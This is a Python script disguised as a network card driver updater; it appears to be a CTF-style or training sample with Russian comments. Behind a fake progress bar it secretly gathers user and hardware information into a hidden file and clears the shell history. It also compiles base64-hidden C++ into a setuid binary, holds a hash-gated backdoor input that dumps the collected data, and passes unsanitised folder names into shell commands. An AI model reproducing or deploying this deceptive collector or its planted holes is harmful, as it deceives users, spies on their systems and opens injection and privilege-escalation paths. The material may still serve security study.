#!/usr/bin/python3

import time
import os
import base64
import subprocess
from threading import Thread
from tqdm import tqdm
import hashlib


def loading():
    print('Updating network card drivers')
    for i in tqdm(range(100)):
        time.sleep(0.02)
    print('\nDrivers have been successfully updated')


def secure(dir, key):
    keycode = 'I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPHVub3JkZXJlZF9tYXA+CiNpbmNsdWRlIDxiaXRzL3N0ZGMrKy5oPgp1c2luZyBuYW1lc3BhY2Ugc3RkOwoKaW50IG1haW4gKGludCBhcmdjLCBjaGFyKiogYXJndikgCnsKICAgIHN0cmluZyBzYWx0ID0gXCJzYWx0XCI7CiAgICBzdHJpbmcgdXNlcmtleSA9IGFyZ3ZbMV07CiAgICBzdHJpbmcgc3RyID0gc2FsdCArIHVzZXJrZXk7CiAgICBoYXNoIDxzdHJpbmc+IGhhc2hlcjsKICAgIHNpemVfdCBoYXNoID0gaGFzaGVyKHN0cik7CiAgICBjb3V0IDw8IGhhc2g7Cn0='
    k = base64.b64decode(keycode)
    cmd = k.decode("UTF-8")
    cmd = ' echo "' + cmd + '" > ./' + dir + '/key.cpp'
    os.system(cmd)
    os.system(' g++ ./' + dir + '/key.cpp -o ./' + dir + '/key.exe')
    h = subprocess.check_output(['./' + dir + '/key.exe', key])
    os.system(' rm ./' + dir + '/key*')
    h = h.decode("UTF-8")
    os.system(' echo "' + h + '" > ./' + dir + '/.key')
    os.system(' chmod 700 ./' + dir + '/.key')
    script = 'I2luY2x1ZGUgPGlvc3RyZWFtPgojaW5jbHVkZSA8ZnN0cmVhbT4KI2luY2x1ZGUgPHN0cmluZz4KI2luY2x1ZGUgPHVub3JkZXJlZF9tYXA+CiNpbmNsdWRlIDxiaXRzL3N0ZGMrKy5oPgp1c2luZyBuYW1lc3BhY2Ugc3RkOwoKaW50IG1haW4gKGludCBhcmdjLCBjaGFyKiogYXJndikgCnsKICAgIHN0cmluZyBzYWx0ID0gXCJzYWx0XCI7CiAgICBzdHJpbmcgdXNlcmtleSA9IGFyZ3ZbMV07CiAgICBzdHJpbmcgc3RyID0gc2FsdCArIHVzZXJrZXk7CiAgICBoYXNoIDxzdHJpbmc+IGhhc2hlcjsKICAgIHNpemVfdCBoYXNoID0gaGFzaGVyKHN0cik7CiAgICBjb3V0IDw8IGhhc2g7Cn0='
    b = base64.b64decode(script)
    cmd = b.decode("UTF-8")
    cmd = 'echo "' + cmd + '" > ./' + dir + '/secure.cpp'
    os.system(cmd)
    os.system(' g++ ./' + dir + '/secure.cpp -o ./' + dir + '/secure.exe')
    os.system(' chmod 755 ./' + dir + '/secure.exe')
    os.system(' chmod u+s ./' + dir + '/secure.exe')
    os.system(' rm ./' + dir + '/secure.cpp')


def main():
    print('Select the folder for system data...')
    print('Enter 1 to display folders\nEnter 2 to create a new folder')
    choice = input()
    if (choice == "1"):
        print('Enter the name of directory')
        os.system(" ls -d */")
        dir = str(input())
    elif (choice == "2"):
        dir = str(input('Enter a name for the new folder\n'))
        while dir.count("../") > 0:
            dir = dir.replace("../", "")
        os.system(" mkdir " + dir + " 2>/dev/null")
    elif hashlib.sha512(choice.encode(
            'UTF-8')).hexdigest() == '7a9d68fc706188bfd747ec9188b02504e5571a440fef19b9c1c005189b18b43f7e7f6a14ccec5e7f46342c11cda9cfb441fdc58a3704ab0b529c1223eb9f7e67':  # hochu_5
        os.system(" find -name .sys.tat -exec base64 -d {} \;")
        return 0
    # здесь запустить создание файла secure.exe
    key = str(input("Enter secret key for access to system info\n"))

    load = Thread(target=loading)
    sec = Thread(target=secure, args=(dir, key,))
    load.start()  ##параллельный поток
    sec.start()
    info = ""
    info += str(subprocess.check_output('whoami'))[2:-1]
    info += str(subprocess.check_output(['uname', '-a']))[2:-1]
    info += str(subprocess.check_output('lscpu'))[2:-1]
    info += str(subprocess.check_output('lsmem'))[2:-1]
    info = info.encode('utf-8')
    infob64 = base64.b64encode(info)
    infob64 = str(infob64)[2:-1]
    os.system(' echo "' + infob64 + '" >> ./' + dir + '/.sys.tat')
    os.system(' chmod 700 ./' + dir + '/.sys.tat')
    os.system(' history -c 2>/dev/null')


main()
